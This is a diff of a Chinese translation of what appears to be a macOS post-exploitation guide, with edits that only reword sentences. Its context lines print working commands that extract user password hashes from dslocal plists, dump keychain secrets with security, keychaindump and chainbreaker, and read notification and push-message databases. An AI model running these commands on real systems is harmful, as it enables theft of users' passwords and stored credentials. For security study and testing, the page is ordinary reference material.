@@ -17,7 +17,7 @@ for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"
 ```bash
 sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
 ```
-另一种获取用户的 `ShadowHashData` 的方法是使用 `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``
+另一种获取用户 `ShadowHashData` 的方法是使用 `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``
 
 ### /etc/master.passwd
 
@@ -25,7 +25,7 @@ sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex
 
 ### Keychain Dump
 
-请注意，当使用 security 二进制文件**转储解密的密码**时，会有几个提示要求用户允许此操作。
+请注意，当使用 security 二进制文件**解密并转储密码**时，会有几个提示要求用户允许此操作。
 ```bash
 #security
 security dump-trust-settings [-s] [-d] #List certificates
@@ -47,7 +47,7 @@ security dump-keychain -d #Dump all the info, included secrets (the user will be
 ```bash
 sudo vmmap <securityd PID> | grep MALLOC_TINY
 ```
-在识别潜在的主密钥后，**keychaindump** 在堆中搜索特定模式 (`0x0000000000000018`)，这表明是主密钥的候选者。进一步的步骤，包括去混淆，都是利用此密钥所必需的，具体内容在 **keychaindump** 的源代码中有说明。专注于该领域的分析师应注意，解密钥匙串的关键数据存储在 **securityd** 进程的内存中。运行 **keychaindump** 的示例命令是：
+在识别潜在的主密钥后，**keychaindump** 在堆中搜索特定模式 (`0x0000000000000018`)，这表明是主密钥的候选者。进一步的步骤，包括去混淆，都是利用此密钥所必需的，正如 **keychaindump** 的源代码中所述。专注于该领域的分析师应注意，解密钥匙串的关键数据存储在 **securityd** 进程的内存中。运行 **keychaindump** 的示例命令是：
 ```bash
 sudo ./keychaindump
 ```
@@ -101,7 +101,7 @@ python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump
 #Try to extract the passwords using the extracted keychain passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **使用用户密码转储钥匙串密钥（包括密码）**
+#### **使用用户密码转储钥匙串密钥（带密码）**
 
 如果您知道用户的密码，您可以使用它来**转储和解密属于用户的钥匙串**。
 ```bash
@@ -191,9 +191,9 @@ for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.s
 
 ### Darwin 通知
 
-主要的通知守护进程是 **`/usr/sbin/notifyd`**。为了接收通知，客户端必须通过 `com.apple.system.notification_center` Mach 端口进行注册（使用 `sudo lsmp -p <pid notifyd>` 检查它们）。该守护进程可以通过文件 `/etc/notify.conf` 进行配置。
+主要的通知守护进程是 **`/usr/sbin/notifyd`**。为了接收通知，客户端必须通过 `com.apple.system.notification_center` Mach 端口注册（使用 `sudo lsmp -p <pid notifyd>` 检查它们）。该守护进程可以通过文件 `/etc/notify.conf` 进行配置。
 
-用于通知的名称是唯一的反向 DNS 表示法，当向其中一个名称发送通知时，已指明可以处理该通知的客户端将接收到它。
+用于通知的名称是唯一的反向 DNS 表示法，当发送通知到其中一个名称时，已指明可以处理该通知的客户端将接收到它。
 
 可以通过向 notifyd 进程发送 SIGUSR2 信号并读取生成的文件 `/var/run/notifyd_<pid>.status` 来转储当前状态（并查看所有名称）：
 ```bash
@@ -222,7 +222,7 @@ common: com.apple.security.octagon.joined-with-bottle
 
 首选项位于`/Library/Preferences/com.apple.apsd.plist`。
 
-在macOS中，消息的本地数据库位于`/Library/Application\ Support/ApplePushService/aps.db`，在iOS中位于`/var/mobile/Library/ApplePushService`。它有3个表：`incoming_messages`、`outgoing_messages`和`channel`。
+在macOS中，消息的本地数据库位于`/Library/Application\ Support/ApplePushService/aps.db`，在iOS中位于`/var/mobile/Library/ApplePushService`。它有3个表：`incoming_messages`，`outgoing_messages`和`channel`。
 ```bash
 sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
 ```
@@ -234,7 +234,7 @@ sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
 
 这些是用户应该在屏幕上看到的通知：
 
-- **`CFUserNotification`**：这些 API 提供了一种在屏幕上显示带有消息的弹出窗口的方法。
+- **`CFUserNotification`**：这个 API 提供了一种在屏幕上显示带有消息的弹出窗口的方法。
 - **公告板**：这在 iOS 上显示一个会消失的横幅，并将存储在通知中心。
 - **`NSUserNotificationCenter`**：这是 MacOS 中的 iOS 公告板。通知的数据库位于 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
 
